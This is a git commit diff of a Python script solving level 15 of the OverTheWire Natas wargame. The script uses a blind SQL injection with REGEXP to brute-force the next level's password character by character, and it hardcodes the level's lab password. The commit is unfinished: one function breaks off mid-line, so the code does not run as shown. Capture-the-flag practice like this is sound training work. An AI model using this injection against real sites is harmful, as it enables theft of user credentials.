196f3f5f8658cec5f72f90840e59e943153cf323
Piotr Czajka <piotr_czajka@outlook.com>
2017-09-18 15:57:45 +0200

    Have an idea

--- natas/natas15.py
+++ natas/natas15.py
@@ -1,33 +1,65 @@
 import requests
+import string
 from bs4 import BeautifulSoup
 from requests.auth import HTTPBasicAuth
 
 password = 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'
 username = 'natas15'
 
-# SQL: SELECT * FROM users where username="""
+# SQL: SELECT * FROM users where username="" -- "
 
-data = {
-        'username': '<?php echo "dupa";'
-        }
 
-get_data = {
-        'debug': 'true'
-        }
+def hackzor(regexp):
+    data = {
+            'username': 'natas16" AND CAST(password AS BINARY) REGEXP "{}" -- '.format(regexp)
+            }
 
-get = ''
-for k, v in get_data.items():
-    get += '{}={}&'.format(k, v)
+    get_data = {
+            'debug': 'true'
+            }
 
-if get:
-    get = '?' + get[:-1]
+    get = ''
+    for k, v in get_data.items():
+        get += '{}={}&'.format(k, v)
 
-url = 'http://{}.natas.labs.overthewire.org{}'.format(username, get)
+    if get:
+        get = '?' + get[:-1]
 
-auth = HTTPBasicAuth(username, password)
+    url = 'http://{}.natas.labs.overthewire.org{}'.format(username, get)
 
-response = requests.post(url, auth=auth, data=data)
+    auth = HTTPBasicAuth(username, password)
 
-bs4 = BeautifulSoup(response.content, 'html.parser')
+    response = requests.post(url, auth=auth, data=data)
 
-print(bs4.prettify)
+    bs4 = BeautifulSoup(response.content, 'html.parser')
+
+    text = bs4.get_text()
+
+    if 'exists' in text:
+        return True
+    return False
+
+
+def get_next_char(rng, passquery):
+    if hackzor(passquery + '$'):
+        return '$'
+    start = rng[1]
+    end = rng[-1]
+    if not hackzor('[]')
+
+
+def smart_bruteforce_password():
+    passquery = '^'
+    ranges = (string.ascii_lowercase, string.ascii_uppercase, string.digits)
+    while True:
+        for rng in ranges:
+            char = get_next_char(rng, passquery)
+            if char:
+                passquery += char
+                break
+        print(passquery)
+        if passquery.endswith('$'):
+            return passquery[1:-1]
+
+
+password = smart_bruteforce_password()
